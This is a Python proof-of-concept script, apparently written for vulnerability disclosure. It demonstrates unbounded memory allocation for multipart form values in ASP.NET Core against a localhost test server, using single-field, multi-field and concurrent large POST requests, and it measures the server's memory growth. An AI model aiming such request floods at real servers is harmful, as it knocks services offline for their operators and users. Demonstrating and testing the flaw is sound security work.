#!/usr/bin/env python3
"""
Safe PoC: ASP.NET Core Multipart Form Value Memory Exhaustion
=============================================================

Demonstrates that multipart form values bypass ValueLengthLimit (4MB)
and are read into memory via ReadToEndAsync() with no size limit.

Targets localhost only. Sends controlled payloads and measures server
memory growth to prove the vulnerability without causing actual OOM.

Usage:
  1. Start the server: cd poc-server && dotnet run -c Release
  2. Run this PoC:     python3 poc-multipart-oom.py
"""

import http.client
import socket
import time
import sys
import json
import threading

HOST = "localhost"
PORT = 5000
BOUNDARY = "----FormBoundary7MA4YWxkTrZu0gW"


def get_server_info():
    try:
        conn = http.client.HTTPConnection(HOST, PORT, timeout=5)
        conn.request("GET", "/memory")
        resp = conn.getresponse()
        data = json.loads(resp.read())
        conn.close()
        return data
    except:
        return None


def get_proc_rss_mb(pid):
    try:
        with open(f"/proc/{pid}/status") as f:
            for line in f:
                if line.startswith("VmRSS:"):
                    return int(line.split()[1]) / 1024
    except:
        pass
    return 0


def send_multipart(num_fields, value_size_mb):
    """Send multipart POST with large form field values (not files)."""
    chunk_1mb = b"A" * (1024 * 1024)

    # Calculate content length
    content_length = 0
    for i in range(num_fields):
        hdr = f"--{BOUNDARY}\r\nContent-Disposition: form-data; name=\"field{i}\"\r\n\r\n"
        content_length += len(hdr.encode()) + value_size_mb * 1024 * 1024 + 2
    content_length += len(f"--{BOUNDARY}--\r\n".encode())

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(120)
    sock.connect((HOST, PORT))

    request_line = (
        f"POST /upload HTTP/1.1\r\n"
        f"Host: {HOST}:{PORT}\r\n"
        f"Content-Type: multipart/form-data; boundary={BOUNDARY}\r\n"
        f"Content-Length: {content_length}\r\n"
        f"\r\n"
    ).encode()
    sock.sendall(request_line)

    for i in range(num_fields):
        hdr = f"--{BOUNDARY}\r\nContent-Disposition: form-data; name=\"field{i}\"\r\n\r\n"
        sock.sendall(hdr.encode())
        for _ in range(value_size_mb):
            sock.sendall(chunk_1mb)
        sock.sendall(b"\r\n")

    sock.sendall(f"--{BOUNDARY}--\r\n".encode())

    # Read response
    sock.settimeout(120)
    response = b""
    try:
        while True:
            data = sock.recv(4096)
            if not data:
                break
            response += data
            if b"\r\n\r\n" in response:
                hdr_end = response.index(b"\r\n\r\n") + 4
                headers = response[:hdr_end].decode(errors="replace")
                for line in headers.split("\r\n"):
                    if line.lower().startswith("content-length:"):
                        body_len = int(line.split(":")[1].strip())
                        body = response[hdr_end:]
                        while len(body) < body_len:
                            body += sock.recv(4096)
                        response = response[:hdr_end] + body
                break
    except socket.timeout:
        pass
    sock.close()

    status_ok = b"200" in response[:30] if response else False
    return status_ok


def server_alive():
    try:
        conn = http.client.HTTPConnection(HOST, PORT, timeout=10)
        conn.request("GET", "/")
        r = conn.getresponse()
        r.read()
        conn.close()
        return r.status == 200
    except:
        return False


# ─── Main ───────────────────────────────────────────────────────────────

print("=" * 65)
print("  ASP.NET Core Multipart Form Value Memory Exhaustion PoC")
print("=" * 65)
print()

info = get_server_info()
if not info:
    print("ERROR: Server not running. Start it first:")
    print("  cd poc-server && dotnet run -c Release")
    sys.exit(1)

pid = info["pid"]
initial_rss = get_proc_rss_mb(pid)

print(f"Server PID: {pid}")
print(f"Initial RSS: {initial_rss:.0f} MB")
print()
print("Vulnerability: multipart form values read via ReadToEndAsync()")
print("with no per-value size limit (ValueLengthLimit only enforced")
print("for URL-encoded forms, not multipart).")
print()

# ─── Test 1: Increasing single-field sizes ──────────────────────────────

print("[Test 1] Single-field requests — increasing value sizes")
print(f"{'Value':>8} | {'RSS After':>10} | {'Growth':>10} | {'Result':>8}")
print("-" * 48)

for mb in [1, 5, 10, 25, 50]:
    before = get_proc_rss_mb(pid)
    ok = send_multipart(1, mb)
    time.sleep(0.5)
    after = get_proc_rss_mb(pid)
    growth = after - before
    print(f"{mb:>6}MB | {after:>7.0f} MB | {growth:>+8.0f}MB | {'OK' if ok else 'FAIL':>8}")
    if not server_alive():
        print(">>> SERVER UNAVAILABLE <<<")
        break
    time.sleep(0.5)

print()

# ─── Test 2: Multi-field single request ─────────────────────────────────

print("[Test 2] Multi-field requests (all values held in memory at once)")
print(f"{'Layout':>14} | {'Total':>7} | {'RSS After':>10} | {'Growth':>10} | {'Result':>8}")
print("-" * 62)

for nf, sz in [(2, 25), (4, 25), (8, 10), (4, 50)]:
    if not server_alive():
        print(">>> SERVER UNAVAILABLE <<<")
        break
    total = nf * sz
    before = get_proc_rss_mb(pid)
    ok = send_multipart(nf, sz)
    time.sleep(1)
    after = get_proc_rss_mb(pid)
    growth = after - before
    label = f"{nf}x{sz}MB"
    print(f"{label:>14} | {total:>5}MB | {after:>7.0f} MB | {growth:>+8.0f}MB | {'OK' if ok else 'FAIL':>8}")
    time.sleep(1)

print()

# ─── Test 3: Concurrent attack ──────────────────────────────────────────

print("[Test 3] Concurrent requests — parallel memory exhaustion")
CONC = 4
NF = 4
SZ = 25

results = {"ok": 0, "fail": 0}
lock = threading.Lock()

def attack(tid):
    try:
        ok = send_multipart(NF, SZ)
        with lock:
            results["ok" if ok else "fail"] += 1
    except:
        with lock:
            results["fail"] += 1

if server_alive():
    before = get_proc_rss_mb(pid)
    threads = [threading.Thread(target=attack, args=(i,)) for i in range(CONC)]
    t0 = time.monotonic()
    for t in threads:
        t.start()

    print(f"  Launched {CONC} concurrent requests ({NF}x{SZ}MB = {NF*SZ}MB each)")
    for tick in range(15):
        time.sleep(2)
        rss = get_proc_rss_mb(pid)
        active = sum(1 for t in threads if t.is_alive())
        print(f"  t+{(tick+1)*2:>2}s: RSS={rss:.0f}MB (+{rss-before:.0f}MB), threads={active}")
        if active == 0:
            break

    for t in threads:
        t.join(timeout=5)

    after = get_proc_rss_mb(pid)
    print(f"\n  Concurrent results: {results['ok']} OK, {results['fail']} failed")
    print(f"  Total network data: {CONC*NF*SZ}MB")
    print(f"  Server RSS growth: +{after-before:.0f}MB")

print()

# ─── Summary ────────────────────────────────────────────────────────────

final_rss = get_proc_rss_mb(pid)
print("=" * 65)
print("  RESULTS")
print("=" * 65)
print()
print(f"  Initial RSS:  {initial_rss:.0f} MB")
print(f"  Final RSS:    {final_rss:.0f} MB")
print(f"  Total growth: +{final_rss - initial_rss:.0f} MB")
print()
print("  The server allocated significantly more memory than the")
print("  network payload, confirming the unbounded string allocation")
print("  in ReadToEndAsync() for multipart form values.")
print()
print("  URL-encoded forms would reject values > 4MB (ValueLengthLimit).")
print("  Multipart forms have no equivalent protection.")
